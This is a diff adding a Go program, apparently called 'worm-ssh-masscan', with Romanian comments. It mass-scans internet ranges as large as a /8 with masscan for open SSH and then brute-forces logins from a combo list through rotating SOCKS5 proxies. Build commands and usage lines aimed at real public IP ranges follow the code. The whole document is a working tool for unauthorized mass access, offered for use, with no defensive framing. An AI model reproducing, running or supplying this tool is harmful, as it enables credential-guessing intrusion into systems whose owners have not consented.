@@ -1,0 +1,297 @@
+package main
+
+import (
+	"bufio"
+	"flag"
+	"fmt"
+	"math/rand"
+	"net"
+	"os"
+	"os/exec"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"time"
+
+	"github.com/fatih/color"
+	"golang.org/x/crypto/ssh"
+	"golang.org/x/net/proxy"
+)
+
+var (
+	target      = flag.String("t", "", "Țintă: IP, subnet (/8 /16 /24) sau fișier")
+	comboFile   = flag.String("c", "combo.txt", "Fișier combo (user:pass)")
+	proxyFile   = flag.String("x", "", "Fișier proxy SOCKS5")
+	threads     = flag.Int("threads", 80, "Număr thread-uri bruteforce")
+	timeoutSec  = flag.Int("timeout", 7, "Timeout per încercare")
+	maxAttempts = flag.Int("max", 0, "Număr maxim încercări (0 = nelimitat)")
+	rate        = flag.Int("rate", 100000, "Rate Masscan (pachete/sec)")
+	scanOnly    = flag.Bool("scan", false, "Doar scan cu Masscan")
+)
+
+var (
+	attempts uint64
+	found    uint64
+)
+
+func main() {
+	flag.Parse()
+
+	if *target == "" {
+		color.Red("[-] Folosește -t pentru țintă")
+		flag.Usage()
+		return
+	}
+
+	rand.Seed(time.Now().UnixNano())
+
+	color.Cyan("╔════════════════════════════════════════════╗")
+	color.Cyan("║   WORM SSH Scanner + Random Combo BF       ║")
+	color.Cyan("║              Powered by Masscan            ║")
+	color.Cyan("╚════════════════════════════════════════════╝")
+	fmt.Printf("Target : %s\n", *target)
+	fmt.Printf("Combo  : %s\n", *comboFile)
+	if *proxyFile != "" {
+		fmt.Printf("Proxy  : %s\n", *proxyFile)
+	}
+	fmt.Printf("Threads: %d | Masscan rate: %d pps\n\n", *threads, *rate)
+
+	// Scan cu Masscan
+	openIPs := runMasscan(*target, *rate)
+	if len(openIPs) == 0 {
+		color.Red("[-] Nu s-au găsit IP-uri cu portul 22 deschis.")
+		return
+	}
+
+	color.Green("[+] Masscan a găsit %d IP-uri cu SSH deschis.", len(openIPs))
+
+	if *scanOnly {
+		saveToFile("open-ssh.txt", openIPs)
+		color.Yellow("[*] IP-urile deschise salvate în open-ssh.txt")
+		return
+	}
+
+	// Bruteforce
+	combos, err := loadCombos(*comboFile)
+	if err != nil {
+		color.Red("[-] Eroare combo: %v", err)
+		return
+	}
+
+	if len(combos) == 0 {
+		color.Red("[-] Combo list gol!")
+		return
+	}
+
+	proxies := loadProxies(*proxyFile)
+
+	color.Yellow("[*] Încărcat %d combo-uri. Încep Random Bruteforce...\n", len(combos))
+
+	var wg sync.WaitGroup
+	foundChan := make(chan bool, 1)
+
+	for i := 0; i < *threads; i++ {
+		wg.Add(1)
+		go worker(openIPs, combos, proxies, *timeoutSec, foundChan, &wg)
+	}
+
+	wg.Wait()
+
+	if atomic.LoadUint64(&found) == 0 {
+		color.Red("\n[-] Nu s-a găsit nicio combinație validă.")
+	}
+}
+
+func worker(openIPs, combos, proxies []string, timeout int, foundChan chan bool, wg *sync.WaitGroup) {
+	defer wg.Done()
+
+	for {
+		if len(foundChan) > 0 {
+			return
+		}
+
+		if *maxAttempts > 0 && atomic.LoadUint64(&attempts) >= uint64(*maxAttempts) {
+			return
+		}
+
+		ip := openIPs[rand.Intn(len(openIPs))]
+		combo := combos[rand.Intn(len(combos))]
+		username, password := parseCombo(combo)
+
+		proxyStr := "direct"
+		if len(proxies) > 0 {
+			proxyStr = proxies[rand.Intn(len(proxies))]
+		}
+
+		atomic.AddUint64(&attempts, 1)
+
+		if trySSHWithProxy(ip, 22, username, password, proxyStr, timeout) {
+			atomic.StoreUint64(&found, 1)
+			foundChan <- true
+
+			color.Green("\n[+] SUCCES - PAROLĂ GĂSITĂ!")
+			color.Green("   IP       : %s", ip)
+			color.Green("   Username : %s", username)
+			color.Green("   Password : %s", password)
+			if proxyStr != "direct" {
+				color.Green("   Proxy    : %s", proxyStr)
+			}
+			return
+		}
+
+		if atomic.LoadUint64(&attempts)%40 == 0 {
+			printProgress(len(combos))
+		}
+	}
+}
+
+func runMasscan(target string, rate int) []string {
+	color.Yellow("[*] Pornesc Masscan pe %s (port 22) cu rate %d pps...", target, rate)
+
+	cmd := exec.Command("sudo", "masscan",
+		"--rate", fmt.Sprintf("%d", rate),
+		"-p", "22",
+		"--output-format", "list",
+		"--output-filename", "/tmp/masscan.tmp",
+		target,
+	)
+
+	err := cmd.Run()
+	if err != nil {
+		color.Red("[-] Masscan a eșuat: %v", err)
+		color.Yellow("Asigură-te că rulezi cu sudo și că masscan este instalat.")
+		return []string{}
+	}
+
+	// Citim rezultatele
+	data, err := os.ReadFile("/tmp/masscan.tmp")
+	if err != nil {
+		color.Red("[-] Nu am putut citi rezultatele Masscan.")
+		return []string{}
+	}
+
+	var ips []string
+	lines := strings.Split(string(data), "\n")
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if strings.HasPrefix(line, "open") {
+			parts := strings.Fields(line)
+			if len(parts) >= 3 {
+				ip := strings.TrimSpace(parts[1])
+				if net.ParseIP(ip) != nil {
+					ips = append(ips, ip)
+				}
+			}
+		}
+	}
+
+	// Curățăm fișierul temporar
+	os.Remove("/tmp/masscan.tmp")
+
+	return ips
+}
+
+func loadCombos(path string) ([]string, error) {
+	file, err := os.Open(path)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
+
+	var combos []string
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
+		if line != "" && !strings.HasPrefix(line, "#") && strings.Contains(line, ":") {
+			combos = append(combos, line)
+		}
+	}
+	return combos, scanner.Err()
+}
+
+func loadProxies(path string) []string {
+	if path == "" {
+		return []string{}
+	}
+	file, err := os.Open(path)
+	if err != nil {
+		return []string{}
+	}
+	defer file.Close()
+
+	var proxies []string
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
+		if line != "" && !strings.HasPrefix(line, "#") {
+			proxies = append(proxies, line)
+		}
+	}
+	return proxies
+}
+
+func parseCombo(combo string) (string, string) {
+	parts := strings.SplitN(combo, ":", 2)
+	if len(parts) == 2 {
+		return parts[0], parts[1]
+	}
+	return "", ""
+}
+
+func trySSHWithProxy(host string, port int, username, password, proxyStr string, timeoutSec int) bool {
+	var conn net.Conn
+	var err error
+
+	if proxyStr == "direct" {
+		address := fmt.Sprintf("%s:%d", host, port)
+		conn, err = net.DialTimeout("tcp", address, time.Duration(timeoutSec)*time.Second)
+	} else {
+		dialer, _ := proxy.SOCKS5("tcp", proxyStr, nil, proxy.Direct)
+		address := fmt.Sprintf("%s:%d", host, port)
+		conn, err = dialer.Dial("tcp", address)
+	}
+
+	if err != nil {
+		return false
+	}
+	defer conn.Close()
+
+	config := &ssh.ClientConfig{
+		User:            username,
+		Auth:            []ssh.AuthMethod{ssh.Password(password)},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+		Timeout:         time.Duration(timeoutSec) * time.Second,
+	}
+
+	_, _, _, err = ssh.NewClientConn(conn, fmt.Sprintf("%s:%d", host, port), config)
+	return err == nil
+}
+
+func printProgress(total int) {
+	att := atomic.LoadUint64(&attempts)
+	fmt.Printf("\r[*] Încercări: %d | Combo-uri: %d", att, total)
+}
+
+func saveToFile(filename string, ips []string) {
+	file, _ := os.Create(filename)
+	defer file.Close()
+	for _, ip := range ips {
+		file.WriteString(ip + "\n")
+	}
+}
+
+sudo apt install masscan -y
+
+rm -f go.mod go.sum
+go mod init worm-ssh-masscan
+go get golang.org/x/crypto/ssh
+go get golang.org/x/net/proxy
+go get github.com/fatih/color
+
+go build -o worm-ssh-masscan worm-ssh-masscan.go
+
+# Scan /16 cu Masscan + bruteforce
+sudo ./worm-ssh-masscan -t 45.67.0.0/16 -c combo.txt --threads 80 --rate 80000
+
+# Doar scan
+sudo ./worm-ssh-masscan -t 103.0.0.0/8 --scan --rate 50000
